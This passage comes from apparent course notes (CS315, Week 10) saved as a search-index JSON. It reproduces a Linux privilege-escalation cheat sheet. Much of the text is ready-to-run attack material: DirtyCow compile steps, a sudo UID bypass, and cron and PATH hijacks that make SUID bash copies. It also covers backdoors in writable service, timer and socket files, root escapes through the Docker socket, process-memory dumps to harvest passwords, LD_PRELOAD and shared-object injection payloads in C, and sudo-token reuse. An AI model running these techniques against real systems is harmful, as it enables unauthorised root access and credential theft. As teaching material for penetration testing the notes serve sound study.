-d \",\" | tr ' ' '\\n' | grep -v \"^\\d\\.\\d$\" | sort -u -r | tr '\\n' ' ' Tools that could help searching for kernel exploits are: linux-exploit-suggester.sh linux-exploit-suggester2.pl linuxprivchecker.py (execute IN victim,only checks exploits for kernel 2.x) Always search the kernel version in Google , maybe your kernel version is wrote in some kernel exploit and then you will be sure that this exploit is valid.","title":"Kernel exploits"},{"location":"CS315/Week%2010/#cve-2016-5195-dirtycow","text":"Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8 # make dirtycow stable echo 0 > /proc/sys/vm/dirty_writeback_centisecs g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c","title":"CVE-2016-5195 (DirtyCow)"},{"location":"CS315/Week%2010/#sudo-version","text":"Based on the vulnerable sudo versions that appear in: searchsploit sudo You can check if the sudo version is vulnerable using this grep. sudo -V | grep \"Sudo ver\" | grep \"1\\.[01234567]\\.[0-9]\\+\\|1\\.8\\.1[0-9]\\*\\|1\\.8\\.2[01234567]\"","title":"Sudo version"},{"location":"CS315/Week%2010/#sudo-v128","text":"From @sickrov sudo -u#-1 /bin/bash","title":"sudo &lt;= v1.28"},{"location":"CS315/Week%2010/#dmesg-signature-verification-failed","text":"Check smasher2 box of HTB for an example of how this vuln could be exploited dmesg 2>/dev/null | grep \"signature\"","title":"Dmesg signature verification failed"},{"location":"CS315/Week%2010/#more-system-enumeration","text":"date 2>/dev/null #Date (df -h || lsblk) #System stats lscpu #CPU info lpstat -a 2>/dev/null #Printers info","title":"More system enumeration"},{"location":"CS315/Week%2010/#enumerate-possible-defenses","text":"","title":"Enumerate possible defenses"},{"location":"CS315/Week%2010/#apparmor","text":"if [ `which aa-status 2>/dev/null` ]; then aa-status elif [ `which apparmor_status 2>/dev/null` ]; then apparmor_status elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then ls -d /etc/apparmor* else echo \"Not found AppArmor\" fi","title":"AppArmor"},{"location":"CS315/Week%2010/#grsecurity","text":"((uname -r | grep \"\\-grsec\" >/dev/null 2>&1 || grep \"grsecurity\" /etc/sysctl.conf >/dev/null 2>&1) && echo \"Yes\" || echo \"Not found grsecurity\")","title":"Grsecurity"},{"location":"CS315/Week%2010/#pax","text":"(which paxctl-ng paxctl >/dev/null 2>&1 && echo \"Yes\" || echo \"Not found PaX\")","title":"PaX"},{"location":"CS315/Week%2010/#execshield","text":"(grep \"exec-shield\" /etc/sysctl.conf || echo \"Not found Execshield\")","title":"Execshield"},{"location":"CS315/Week%2010/#selinux","text":"(sestatus 2>/dev/null || echo \"Not found sestatus\")","title":"SElinux"},{"location":"CS315/Week%2010/#aslr","text":"cat /proc/sys/kernel/randomize_va_space 2>/dev/null #If 0, not enabled","title":"ASLR"},{"location":"CS315/Week%2010/#docker-breakout","text":"If you are inside a docker container you can try to escape from it: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout","title":"Docker Breakout"},{"location":"CS315/Week%2010/#drives","text":"Check what is mounted and unmounted , where and why. If anything is unmounted you could try to mount it and check for private info ls /dev 2>/dev/null | grep -i \"sd\" cat /etc/fstab 2>/dev/null | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2>/dev/null #Check if credentials in fstab grep -E \"(user|username|login|pass|password|pw|credentials)[=:]\" /etc/fstab /etc/mtab 2>/dev/null","title":"Drives"},{"location":"CS315/Week%2010/#installed-software","text":"","title":"Installed Software"},{"location":"CS315/Week%2010/#useful-software","text":"Enumerate useful binaries which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null Also, check if any compiler is installed . This is useful if you need to use some kernel exploit as it's recommended to compile it in the machine where you are going to use it (or in one similar) (dpkg --list 2>/dev/null | grep \"compiler\" | grep -v \"decompiler\\|lib\" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r \"/gcc[0-9\\.-]\\+$\" 2>/dev/null | grep -v \"/doc/\")","title":"Useful software"},{"location":"CS315/Week%2010/#vulnerable-software-installed","text":"Check for the version of the installed packages and services . Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges\u2026 It is recommended to check manually the version of the more suspicious installed software. dpkg -l #Debian rpm -qa #Centos If you have SSH access to the machine you could also use openVAS to check for outdated and vulnerable software installed inside the machine. Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some application like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits","title":"Vulnerable Software Installed"},{"location":"CS315/Week%2010/#processes","text":"Take a look to what processes are being executed and check if any process has more privileges that it should (maybe a tomcat being executed by root?) ps aux ps -ef top -n 1 Always check for possible electron/cef/chromium debuggers running, you could abuse it to escalate privileges . Linpeas detect those by checking the --inspect parameter inside the command line of the process. Also check your privileges over the processes binaries , maybe you can overwrite someone.","title":"Processes"},{"location":"CS315/Week%2010/#process-monitoring","text":"You can use tools like pspy to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.","title":"Process monitoring"},{"location":"CS315/Week%2010/#process-memory","text":"Some services of a server save credentials in clear text inside the memory . Normally you will need root privileges to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials. However, remember that as a regular user you can read the memory of the processes you own .","title":"Process memory"},{"location":"CS315/Week%2010/#gdb","text":"If you have access to the memory of a FTP service (for example) you could get the Heap and search inside of it the credentials. gdb -p <FTP_PROCESS_PID> (gdb) info proc mappings (gdb) q (gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD> (gdb) q strings /tmp/mem_ftp #User and password","title":"GDB"},{"location":"CS315/Week%2010/#gdb-script","text":"#!/bin/bash #./dump-memory.sh <PID> grep rw-p /proc/$1/maps \\ | sed -n 's/^\\([0-9a-f]*\\)-\\([0-9a-f]*\\) .*$/\\1 \\2/p' \\ | while read start stop; do \\ gdb --batch --pid $1 -ex \\ \"dump memory $1-$start-$stop.dump 0x$start 0x$stop\"; \\ done","title":"GDB Script"},{"location":"CS315/Week%2010/#procpidmaps-procpidmem","text":"For a given process ID, maps shows how memory is mapped within that processes' virtual address space; it also shows the permissions of each mapped region . The mem pseudo file exposes the processes memory itself . From the maps file we know which memory regions are readable and their offsets. We use this information to seek into the mem file and dump all readable regions to a file. procdump() ( cat /proc/$1/maps | grep -Fv \".so\" | grep \" 0 \" | awk '{print $1}' | ( IFS=\"-\" while read a b; do dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \\ skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of=\"$1_mem_$a.bin\" done ) cat $1*.bin > $1.dump rm $1*.bin )","title":"/proc/$pid/maps &amp; /proc/$pid/mem"},{"location":"CS315/Week%2010/#devmem","text":"/dev/mem provides access to the system's physical memory, not the virtual memory. The kernels virtual address space can be accessed using /dev/kmem. Typically, /dev/mem is only readable by root and kmem group. strings /dev/mem -n10 | grep -i PASS","title":"/dev/mem"},{"location":"CS315/Week%2010/#tools","text":"To dump a process memory you could use: https://github.com/hajzer/bash-memory-dump (root) - You can manually remove root requirements and dump process owned by you Script A.5 from https://www.delaat.net/rp/2016-2017/p97/report.pdf (root is required)","title":"Tools"},{"location":"CS315/Week%2010/#credentials-from-process-memory","text":"","title":"Credentials from Process Memory"},{"location":"CS315/Week%2010/#manual-example","text":"If you find that the authenticator process is running: ps -ef | grep \"authenticator\" root 2027 2025 0 11:46 ? 00:00:00 authenticator You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory: ./dump-memory.sh 2027 strings *.dump | grep -i password","title":"Manual example"},{"location":"CS315/Week%2010/#mimipenguin","text":"The tool https://github.com/huntergregal/mimipenguin will steal clear text credentials from memory and from some well known files . It requires root privileges to work properly. Feature Process Name GDM password (Kali Desktop, Debian Desktop) gdm-password Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) gnome-keyring-daemon LightDM (Ubuntu Desktop) lightdm VSFTPd (Active FTP Connections) vsftpd Apache2 (Active HTTP Basic Auth Sessions) apache2 OpenSSH (Active SSH Sessions - Sudo Usage) sshd:","title":"mimipenguin"},{"location":"CS315/Week%2010/#scheduledcron-jobs","text":"Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?). crontab -l ls -al /etc/cron* /etc/at* cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v \"^#\"","title":"Scheduled/Cron jobs"},{"location":"CS315/Week%2010/#cron-path","text":"For example, inside /etc/crontab you can find the PATH: PATH= /home/user :/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin ( Note how the user \"user\" has writing privileges over /home/user ) If inside this crontab the root user tries to execute some command or script without setting the path. For example: root overwrite.sh Then, you can get a root shell by using: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh #Wait cron job to be executed /tmp/bash -p #The effective uid and gid to be set to the real uid and gid","title":"Cron path"},{"location":"CS315/Week%2010/#cron-using-a-script-with-a-wildcard-wildcard-injection","text":"If a script being executed by root has a \u201c * \u201d inside a command, you could exploit this to make unexpected things (like privesc). Example: rsync -a *.sh rsync://host.back/src/rbd #You can create a file called \"-e sh myscript.sh\" so the script will execute our script If the wildcard is preceded of a path like /some/path/* , it's not vulnerable (even ./* is not). Read the following page for more wildcard exploitation tricks: https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks","title":"Cron using a script with a wildcard (Wildcard Injection)"},{"location":"CS315/Week%2010/#cron-script-overwriting-and-symlink","text":"If you can modify a cron script executed by root, you can get a shell very easily: echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT> #Wait until it is executed /tmp/bash -p If the script executed by root uses a directory where you have full access , maybe it could be useful to delete that folder and create a symlink folder to another one serving a script controlled by you ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>","title":"Cron script overwriting and symlink"},{"location":"CS315/Week%2010/#frequent-cron-jobs","text":"You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges. For example, to monitor every 0.1s during 1 minute , sort by less executed commands and deleting the commands that have beeing executed all the time, you can do: for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v \"\\[\" | sed '/^.\\{200\\}./d' | sort | grep -E -v \"\\s*[6-9][0-9][0-9]|\\s*[0-9][0-9][0-9][0-9]\"; rm /tmp/monprocs.tmp; You can also use pspy (this will monitor and list every process that start).","title":"Frequent cron jobs"},{"location":"CS315/Week%2010/#invisible-cron-jobs","text":"It's possible to create a cronjob putting a carriage return after a comment (without new line character), and the cron job will work. Example (note the carriege return char): #This is a comment inside a cron config file\\r* * * * * echo \"Surprise!\"","title":"Invisible cron jobs"},{"location":"CS315/Week%2010/#services","text":"","title":"Services"},{"location":"CS315/Week%2010/#writable-service-files","text":"Check if you can write any .service file, if you can, you could modify it so it executes your backdoor when the service is started , restarted or stopped (maybe you will need to wait until the machine is rebooted). For example create your backdoor inside the .service file with ExecStart=/tmp/script.sh","title":"Writable .service files"},{"location":"CS315/Week%2010/#writable-service-binaries","text":"Keep in mid that if you have write permissions over binaries being executed by services , you can change them for backdoors so when the services get re-executed the backdoors will be executed.","title":"Writable service binaries"},{"location":"CS315/Week%2010/#systemd-path-relative-paths","text":"You can see the PATH used by systemd with: systemctl show-environment If you find that you can write in any of the folders of the path you may be able to escalate privileges . You need to search for relative paths being used on service configurations files like: ExecStart=faraday-server ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I' ExecStop=/bin/sh \"uptux-vuln-bin3 -stuff -hello\" Then, create a executable with the same name as the relative path binary inside the systemd PATH folder you can write, and when the service is asked to execute the vulnerable action ( Start , Stop , Reload ), your backdoor will be executed (unprivileged users usually cannot start/stop services but check if you can using sudo -l ). Learn more about services with man systemd.service .","title":"systemd PATH - Relative Paths"},{"location":"CS315/Week%2010/#timers","text":"Timers are systemd unit files whose name ends in . timer that control . service files or events. Timers can be used as an alternative to cron. Timers have built-in support for calendar time events, monotonic time events, and can be run asynchronously. You can enumerate all the timers doing: systemctl list-timers --all","title":"Timers"},{"location":"CS315/Week%2010/#writable-timers","text":"If you can modify a timer you can make it execute some existent systemd.unit (like a .service or a .target ) Unit=backdoor.service In the documentation you can read what the Unit is: The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not \".timer\". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix. Therefore, in order to abuse this permissions you would need to: Find some systemd unit (like a .service ) that is executing a writable binary Find some systemd unit that is executing a relative path and you have writable privileges over the systemd PATH (to impersonate that executable) Learn more about timers with man systemd.timer .","title":"Writable timers"},{"location":"CS315/Week%2010/#enabling-timer","text":"In order to enable a timer you need root privileges and to execute: sudo systemctl enable backu2.timer Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer \u2192 /lib/systemd/system/backu2.timer. Note the timer is activated by creating a symlink to it on /etc/systemd/system/<WantedBy_section>.wants/<name>.timer","title":"Enabling Timer"},{"location":"CS315/Week%2010/#sockets","text":"In brief, a Unix Socket (technically, the correct name is Unix domain socket, UDS ) allows communication between two different processes on either the same machine or different machines in client-server application frameworks. To be more precise, it\u2019s a way of communicating among computers using a standard Unix descriptors file. (From here ). Sockets can be configured using .socket files. Learn more about sockets with man systemd.socket . Inside this file some several interesting parameters can be configured: ListenStream , ListenDatagram , ListenSequentialPacket , ListenFIFO , ListenSpecial , ListenNetlink , ListenMessageQueue , ListenUSBFunction : This options are different but as summary as used to indicate where is going to listen the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen...). Accept : Takes a boolean argument. If true , a service instance is spawned for each incoming connection and only the connection socket is passed to it. If false , all listening sockets themselves are passed to the started service unit , and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. Defaults to false . For performance reasons, it is recommended to write new daemons only in a way that is suitable for Accept=no . ExecStartPre , ExecStartPost : Takes one or more command lines, which are executed before or after the listening sockets /FIFOs are created and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process. ExecStopPre , ExecStopPost : Additional commands that are executed before or after the listening sockets /FIFOs are closed and removed, respectively. Service : Specifies the service unit name to activate on incoming traffic . This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.","title":"Sockets"},{"location":"CS315/Week%2010/#writable-socket-files","text":"If you find a writable .socket file you can add at the beginning of the [Socket] section something like: ExecStartPre=/home/kali/sys/backdoor and the backdoor will be executed before the socket is created. Therefore, you will probably need to wait until the machine is rebooted. Note that the system must be using that socket file configuration or the backdoor won't be executed","title":"Writable .socket files"},{"location":"CS315/Week%2010/#writable-sockets","text":"If you identify any writable socket ( now where are talking about Unix Sockets, not about the config .socket files ), then, you can communicate with that socket and maybe exploit a vulnerability.","title":"Writable sockets"},{"location":"CS315/Week%2010/#enumerate-unix-sockets","text":"netstat -a -p --unix","title":"Enumerate Unix Sockets"},{"location":"CS315/Week%2010/#raw-connection","text":"#apt-get install netcat-openbsd nc -U /tmp/socket #Connect to UNIX-domain stream socket nc -uU /tmp/socket #Connect to UNIX-domain datagram socket #apt-get install socat socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type Exploitation example: https://book.hacktricks.xyz/linux-unix/privilege-escalation/socket-command-injection","title":"Raw connection"},{"location":"CS315/Week%2010/#http-sockets","text":"Note that there may be some sockets listening for HTTP requests ( I'm not talking about .socket files but about the files acting as unix sockets ). You can check this with: curl --max-time 2 --unix-socket /pat/to/socket/files http:/index If the socket respond with a HTTP request, then you can communicate with it and maybe exploit some vulnerability .","title":"HTTP sockets"},{"location":"CS315/Week%2010/#writable-docker-socket","text":"The docker socke t is typically located at /var/run/docker.sock and is only writable by root user and docker group. If for some reason you have write permissions over that socket you can escalate privileges. The following commands can be used to escalate privileges: docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh","title":"Writable Docker Socket"},{"location":"CS315/Week%2010/#use-docker-web-api-from-socket-without-docker-package","text":"If you have access to docker socket but you can't use the docker binary (maybe it isn't even installed), you can use directly the web API with curl . The following commands are a example to create a docker container that mount the root of the host system and use socat to execute commands into the new docker. # List docker images curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json ##[{\"Containers\":-1,\"Created\":1588544489,\"Id\":\"sha256:<ImageID>\",...}] # Send JSON to docker API to create the container curl -XPOST -H \"Content-Type: application/json\" --unix-socket /var/run/docker.sock -d '{\"Image\":\"<ImageID>\",\"Cmd\":[\"/bin/sh\"],\"DetachKeys\":\"Ctrl-p,Ctrl-q\",\"OpenStdin\":true,\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host_root\"}]}' http://localhost/containers/create ##{\"Id\":\"<NewContainerID>\",\"Warnings\":[]} curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start The last step is to use socat to initiate a connection to the container, sending an attach request socat - UNIX-CONNECT:/var/run/docker.sock POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1 Host: Connection: Upgrade Upgrade: tcp #HTTP/1.1 101 UPGRADED #Content-Type: application/vnd.docker.raw-stream #Connection: Upgrade #Upgrade: tcp Now, you can execute commands on the container from this socat connection.","title":"Use docker web API from socket without docker package"},{"location":"CS315/Week%2010/#others","text":"Note that if you have write permissions over the docker socket because you are inside the group docker you have more ways to escalate privileges . If the docker API is listening in a port you can also be able to compromise it .","title":"Others"},{"location":"CS315/Week%2010/#containerd-ctr-privilege-escalation","text":"If you find that you can use the ctr command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation","title":"Containerd (ctr) privilege escalation"},{"location":"CS315/Week%2010/#runc-privilege-escalation","text":"If you find that you can use the runc command read the following page as you may be able to abuse it to escalate privileges : https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation","title":"RunC privilege escalation"},{"location":"CS315/Week%2010/#d-bus","text":"D-BUS is an inter-process communication (IPC) system , providing a simple yet powerful mechanism allowing applications to talk to one another , communicate information and request services. D-BUS was designed from scratch to fulfil the needs of a modern Linux system. D-BUS, as a full-featured IPC and object system, has several intended uses. First, D-BUS can perform basic application IPC, allowing one process to shuttle data to another\u2014think UNIX domain sockets on steroids . Second, D-BUS can facilitate sending events, or signals, through the system, allowing different components in the system to communicate and ultimately to integrate better. For example, a Bluetooth daemon can send an incoming call signal that your music player can intercept, muting the volume until the call ends. Finally, D-BUS implements a remote object system, letting one application request services and invoke methods from a different object\u2014think CORBA without the complications. (From here ). D-Bus uses an allow/deny model , where each message (method call, signal emission, etc.) can be allowed or denied according to the sum of all policy rules which match it. Each or rule in the policy should have the own , send_destination or receive_sender attribute set. Part of the policy of /etc/dbus-1/system.d/wpa_supplicant.conf : <policy user=\"root\"> <allow own=\"fi.w1.wpa_supplicant1\"/> <allow send_destination=\"fi.w1.wpa_supplicant1\"/> <allow send_interface=\"fi.w1.wpa_supplicant1\"/> <allow receive_sender=\"fi.w1.wpa_supplicant1\" receive_type=\"signal\"/> </policy> Therefore, if a policy is allowing your user in anyway to interact with the bus , you could be able to exploit it to escalate privileges (maybe just listing for some passwords?). Note that a policy that doesn't specify any user or group affects everyone ( <policy> ). Policies to the context \"default\" affects everyone not affected by other policies ( <policy context=\"default\" ). Learn how to enumerate and exploit a D-Bus communication here: https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation","title":"D-Bus"},{"location":"CS315/Week%2010/#network","text":"It's always interesting to enumerate the network and figure out the position of the machine.","title":"Network"},{"location":"CS315/Week%2010/#generic-enumeration","text":"#Hostname, hosts and DNS cat /etc/hostname /etc/hosts /etc/resolv.conf dnsdomainname #Content of /etc/inetd.conf & /etc/xinetd.conf cat /etc/inetd.conf /etc/xinetd.conf #Interfaces cat /etc/networks (ifconfig || ip a) #Neighbours (arp -e || arp -a) (route || ip n) #Iptables rules (timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v \"^#\" | grep -Pv \"\\W*\\#\" 2>/dev/null) #Files used by network services lsof -i","title":"Generic enumeration"},{"location":"CS315/Week%2010/#open-ports","text":"Always check network services running on the machine that you wasn't able to interact with before accessing to it: (netstat -punta || ss --ntpu) (netstat -punta || ss --ntpu) | grep \"127.0\"","title":"Open ports"},{"location":"CS315/Week%2010/#sniffing","text":"Check if you can sniff traffic. If you can, you could be able to grab some credentials. timeout 1 tcpdump","title":"Sniffing"},{"location":"CS315/Week%2010/#users","text":"","title":"Users"},{"location":"CS315/Week%2010/#generic-enumeration_1","text":"Check who you are, which privileges do you have, which users are in the systems, which ones can login and which ones have root privileges: #Info about me id || (whoami && groups) 2>/dev/null #List all users cat /etc/passwd | cut -d: -f1 #List users with console cat /etc/passwd | grep \"sh$\" #List superusers awk -F: '($3 == \"0\") {print}' /etc/passwd #Currently logged users w #Login history last | tail #Last log of each user lastlog #List all users and their groups for i in $(cut -d\":\" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort #Current user PGP keys gpg --list-keys 2>/dev/null","title":"Generic Enumeration"},{"location":"CS315/Week%2010/#big-uid","text":"Some Linux versions were affected by a bug that allow users with UID > INT_MAX to escalate privileges. More info: here , here and here . Exploit it using: systemd-run -t /bin/bash","title":"Big UID"},{"location":"CS315/Week%2010/#groups","text":"Check if you are a member of some group that could grant you root privileges: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe","title":"Groups"},{"location":"CS315/Week%2010/#clipboard","text":"Check if anything interesting is located inside the clipboard (if possible) if [ `which xclip 2>/dev/null` ]; then echo \"Clipboard: \"`xclip -o -selection clipboard 2>/dev/null` echo \"Highlighted text: \"`xclip -o 2>/dev/null` elif [ `which xsel 2>/dev/null` ]; then echo \"Clipboard: \"`xsel -ob 2>/dev/null` echo \"Highlighted text: \"`xsel -o 2>/dev/null` else echo \"Not found xsel and xclip\" fi","title":"Clipboard"},{"location":"CS315/Week%2010/#password-policy","text":"grep \"^PASS_MAX_DAYS\\|^PASS_MIN_DAYS\\|^PASS_WARN_AGE\\|^ENCRYPT_METHOD\" /etc/login.defs","title":"Password Policy"},{"location":"CS315/Week%2010/#known-passwords","text":"If you know any password of the environment try to login as each user using the password.","title":"Known passwords"},{"location":"CS315/Week%2010/#su-brute","text":"If don't mind about doing a lot of noise and su and timeout binaries are present on the computer you can try to brute-force user using su-bruteforce . Linpeas with -a parameter also try to brute-force users.","title":"Su Brute"},{"location":"CS315/Week%2010/#writable-path-abuses","text":"","title":"Writable PATH abuses"},{"location":"CS315/Week%2010/#path_1","text":"If you find that you can write inside some folder of the $PATH you may be able to escalate privileges by creating a backdoor inside the writable folder with the name of some command that is going to be executed by a different user (root ideally) and that is not loaded from a folder that is located previous to your writable folder in $PATH.","title":"$PATH"},{"location":"CS315/Week%2010/#sudo-and-suid","text":"You could be allowed to execute some command using sudo or they could have the suid bit. Check it using: sudo -l #Check commands you can execute with sudo find / -perm -4000 2>/dev/null #Find all SUID binaries Some unexpected commands allows you to read and/or write files or even execute command. For example: sudo awk 'BEGIN {system(\"/bin/sh\")}' sudo find /etc -exec sh -i \\; sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh sudo tar c a.tar -I ./runme.sh a ftp>!/bin/sh less>! <shell_comand>","title":"SUDO and SUID"},{"location":"CS315/Week%2010/#nopasswd","text":"Sudo configuration might allow a user to execute some command with another user privileges without knowing the password. $ sudo -l User demo may run the following commands on crashlab: (root) NOPASSWD: /usr/bin/vim In this example the user demo can run vim as root , it is now trivial to get a shell by adding an ssh key into the root directory or by calling sh . sudo vim -c '!sh'","title":"NOPASSWD"},{"location":"CS315/Week%2010/#setenv","text":"This directive allows the user to set an environment variable while executing something: $ sudo -l User waldo may run the following commands on admirer: (ALL) SETENV: /opt/scripts/admin_tasks.sh This example, based on HTB machine Admirer , was vulnerable to PYTHONPATH hijacking in order to load an arbitrary python library while executing the script as root: sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh","title":"SETENV"},{"location":"CS315/Week%2010/#sudo-execution-bypassing-paths","text":"Jump to read other files or use symlinks . For example in sudeores file: hacker10 ALL= (root) /bin/less /var/log/ * sudo less /var/logs/anything less>:e /etc/shadow #Jump to read other files using privileged less ln /etc/shadow /var/log/new sudo less /var/log/new #Use symlinks to read any file If a wilcard is used (*), it is even easier: sudo less /var/log/../../etc/shadow #Read shadow sudo less /var/log/something /etc/shadow #Red 2 files Countermeasures : https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/","title":"Sudo execution bypassing paths"},{"location":"CS315/Week%2010/#sudo-commandsuid-binary-without-command-path","text":"If the sudo permission is given to a single command without specifying the path : hacker10 ALL= (root) less you can exploit it by changing the PATH variable export PATH=/tmp:$PATH #Put your backdoor in /tmp and name it \"less\" sudo less This technique can also be used if a suid binary executes another command without specifying the path to it (always check with strings the content of a weird SUID binary) . Payload examples to execute.","title":"Sudo command/SUID binary without command path"},{"location":"CS315/Week%2010/#suid-binary-with-command-path","text":"If the suid binary executes another command specifying the path , then, you can try to export a function named as the command that the suid file is calling. For example, if a suid binary calls /usr/sbin/service apache2 start you have to try to create the function and export it: function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; } export -f /usr/sbin/service Then, when you call the suid binary, this function will be executed","title":"SUID binary with command path"},{"location":"CS315/Week%2010/#ld_preload","text":"LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library. To avoid this mechanism being used as an attack vector for suid/sgid executable binaries, the loader ignores LD_PRELOAD if ruid != euid . For such binaries, only libraries in standard paths that are also suid/sgid will be preloaded. If you find inside the output of sudo -l the sentence: env_keep+=LD_PRELOAD and you can call some command with sudo, you can escalate privileges. Defaults env_keep += LD_PRELOAD Save as /tmp/pe.c #include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv(\"LD_PRELOAD\"); setgid(0); setuid(0); system(\"/bin/bash\"); } Then compile it using: cd /tmp gcc -fPIC -shared -o pe.so pe.c -nostartfiles Finally, escalate privileges running sudo LD_PRELOAD=pe.so <COMMAND> #Use any command you can run with sudo","title":"LD_PRELOAD"},{"location":"CS315/Week%2010/#suid-binary-so-injection","text":"If you find some weird binary with SUID permissions, you could check if all the .so files are loaded correctly . In order to do so you can execute: strace <SUID-BINARY> 2>&1 | grep -i -E \"open|access|no such file\" For example, if you find something like: pen(\u201c/home/user/.config/libcalc.so\u201d, O_RDONLY) = -1 ENOENT (No such file or directory) you can exploit it. Create the file /home/user/.config/libcalc.c with the code: #include <stdio.h> #include <stdlib.h> static void inject() __attribute__((constructor)); void inject(){ system(\"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p\"); } Compile it using: gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c And execute the binary.","title":"SUID Binary \u2013 so injection"},{"location":"CS315/Week%2010/#gtfobins","text":"GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks. gdb -nx -ex '!sh' -ex quit sudo mysql -e '! /bin/sh' strace -o /dev/null /bin/sh sudo awk 'BEGIN {system(\"/bin/sh\")}' https://gtfobins.github.io/","title":"GTFOBins"},{"location":"CS315/Week%2010/#fallofsudo","text":"If you can access sudo -l you can use the tool FallOfSudo to check if it finds how to exploit any sudo rule.","title":"FallOfSudo"},{"location":"CS315/Week%2010/#reusing-sudo-tokens","text":"In the scenario where you have a shell as a user with sudo privileges but you don't know the password of the user, you can wait him to execute some command using sudo . Then, you can access the token of the session where sudo was used and use it to execute anything as sudo (privilege escalation). Requirements to escalate privileges: You already have a shell as user \" sampleuser \" \" sampleuser \" have used sudo to execute something in the last 15mins (by default that's the duration of the sudo token that allows to use sudo without introducing any password) cat /proc/sys/kernel/yama/ptrace_scope is 0 gdb is accessible (you can be able to upload it) (You can temporarily enable ptrace_scope with echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope or permanently modifying /etc/sysctl.d/10-ptrace.conf and setting kernel.yama.ptrace_scope = 0 ) If all these requirements are met, you can escalate privileges using: https://github.com/nongiach/sudo_inject The first exploit ( exploit.sh ) will create the binary activate_sudo_token in /tmp . You can use it to activate the sudo token in your session (you won't get automatically a root shell, do sudo su ): bash exploit.sh /tmp/activate_sudo_token sudo su The second exploit ( exploit_v2.sh ) will create a sh shell in /tmp owned by root with setuid bash exploit_v2.sh /tmp/sh -p The third exploit ( exploit_v3.sh ) will create a sudoers file that makes sudo tokens eternal and allows all users to use sudo bash exploit_v3.sh sudo su","title":"Reusing Sudo Tokens"},{"location":"CS315/Week%2010/#varrunsudots","text":"If you have write permissions in the folder or on any of the created files inside the folder you can use the binary write_sudo_token to create a sudo token for a user and PID . For example 